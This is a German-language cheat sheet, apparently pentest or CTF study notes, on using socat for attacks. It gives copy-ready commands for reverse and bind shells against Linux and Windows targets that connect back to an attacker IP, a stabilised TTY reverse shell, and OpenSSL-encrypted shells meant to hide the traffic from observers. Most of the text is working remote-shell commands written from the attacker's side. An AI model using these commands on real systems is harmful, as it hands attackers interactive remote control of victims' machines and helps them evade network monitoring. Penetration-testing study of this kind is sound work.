Socat ähnelt netcat in mancher Hinsicht, unterscheidet sich aber in vielen anderen Punkten grundlegend. Am einfachsten kann man sich socat als eine Verbindung zwischen zwei Punkten vorstellen. Alles, was socat tut, ist, eine Verbindung zwischen zwei Punkten herzustellen - ähnlich wie die Portalgun!


### Reverse Shells

Da die Syntax für Netcat durch Verfeinerungen immer Komplexer werden kann hier erstmal die Basic Syntax

```
socat TCP-L <PORT>
```

Diese Shell verbindet wie oben gesagt zwei Punkte direkt miteinander. Allerdings ist das Resultat etwas instabil und vergleichbar mit `nc -lvnp <Port>`

Unter Windows würden wir diesen Befehl verwenden, um eine Rückverbindung herzustellen:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

Die Option „pipes“ wird verwendet, um Powershell (oder cmd.exe) zu zwingen, die Standardein- und -ausgabe im Unix-Stil zu verwenden 
Dies ist der entsprechende Befehl für ein Linux-Ziel:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC: „bash -li“
```

### Bind Shells

Auf einem Linux-Zielsystem würden wir den folgenden Befehl verwenden:
```
socat TCP-L:<PORT> EXEC: „bash -li“
```

Auf einem Windows-Ziel würden wir diesen Befehl für unseren Listener verwenden:
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Wir verwenden das Argument „Pipes“, um eine Schnittstelle zwischen den Unix- und Windows-Methoden zur Handhabung von Ein- und Ausgaben in einer CLI-Umgebung zu schaffen
Unabhängig vom Ziel verwenden wir diesen Befehl auf unserem Angriffsrechner, um eine Verbindung mit dem wartenden Listener herzustellen.

```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Stabile TTY Linux Reverse Shell

Die TTY Reverse shell funktioniert nur wie oben Geschrieben bei Linux Zielen. Hier die neue Listener Syntax

```
socat TCP-L <Port> FILE:`tty`,raw,echo=0
```

Erklärung des Befehls: 
Wie üblich, verbinden wir zwei Punkte miteinander. In diesem Fall sind diese Punkte ein Listening Port und eine Datei. Genauer gesagt, geben wir den aktuellen TTY als Datei an und setzen das Echo auf Null. Dies entspricht in etwa dem Trick mit Strg + Z, `stty raw -echo; fg` in einer netcat-Shell - mit dem zusätzlichen Vorteil, dass es sofort stabil ist und sich in ein vollständiges TTY einhakt.

Der erste Listener kann mit jeder beliebigen Payload verbunden werden; dieser spezielle Listener muss jedoch mit einem ganz bestimmten socat-Befehl aktiviert werden. Das bedeutet, dass das Ziel socat installiert haben muss. Auf den meisten Rechnern ist socat nicht standardmäßig installiert, es ist jedoch möglich, eine vorkompilierte socat-Binärdatei hochzuladen, die dann wie üblich ausgeführt werden kann.

Der spezielle Befehl dafür lautet wie folgt:
```
socat TCP:<Angreifer-ip>:<Angreifer-port> EXEC: „bash -li“,pty,stderr,sigint,setsid,sane
```
Argumente des Befehls erklärt
  
Der erste Teil ist einfach - wir verbinden uns mit dem Listener, der auf unserem eigenen Rechner läuft. Der zweite Teil des Befehls erzeugt eine interaktive Bash-Sitzung mit EXEC: "bash -li". Wir übergeben auch die Argumente: pty, stderr, sigint, setsid und sane:
- pty, weist ein Pseudoterminal auf dem Ziel zu - Teil des Stabilisierungsprozesses
- stderr, stellt sicher, dass alle Fehlermeldungen in der Shell angezeigt werden (oft ein Problem bei nicht-interaktiven Shells)
- sigint, leitet alle Ctrl + C-Befehle in den Unterprozess weiter, was uns erlaubt, Befehle innerhalb der Shell zu beenden
- setsid, erstellt den Prozess in einer neuen Sitzung
- sane, stabilisiert das Terminal und versucht, es zu "normalisieren".
Beispiel Bildlich
https://imgur.com/H12rVDW


### Encrypted Shells

Einer der Großen Vorteile an SoCat ist das man Encrypted Bind und Reverse Shells erstellen kann. Das ist deswegen sehr Praktisch da dann niemand in den Datenverkehr zwischen den Shells reinschnuppern kann.
Um Encrypted Shells zu nutzen muss erstmal ein openssl Zertifikat angelegt werden das geht via 

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Der Befehl legt ein self Signed Certifikat mit 2048bit RSA schlüssel an dessen gültigkeit unter einem Jahr ist. Wenn man diesen Befehl ausführt, wird man aufgefordert, Informationen über das Zertifikat einzugeben. Diese können leer gelassen oder nach dem Zufallsprinzip ausgefüllt werden.

Im Anschluss müssen die eben erstellten Dateien dann in eine zusammen gemerged werden via:

```
cat shell.key shell.crt > shell.pem
```

Nachdem dass alles passiert ist kann man den Listener aufsetzen via

```
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

Dies richtet einen OPENSSL-Listener ein, der unser generiertes Zertifikat verwendet. verify=0 weist die Verbindung an, nicht zu versuchen, zu überprüfen, ob unser Zertifikat von einer anerkannten Stelle ordnungsgemäß signiert wurde. Zu beachten ist, dass das Zertifikat auf dem Gerät verwendet werden muss, das die Abfrage durchführt.

Für Connect back ist dann der Befehl zuständig 

```
socat OPENSSL:<LOKALE-IP>:<LOKALER-PORT>,verify=0 EXEC:/bin/bash
```

Die gleiche Technik würde für eine Bind-Shell gelten:
Ziel:
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
Angreifer:
```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
Auch hier ist zu beachten, dass selbst für ein Windows-Ziel das Zertifikat mit dem Listener verwendet werden muss, so dass das Kopieren der PEM-Datei für eine Bind-Shell erforderlich ist.

BildBeispiel
https://imgur.com/RTT0BZ1
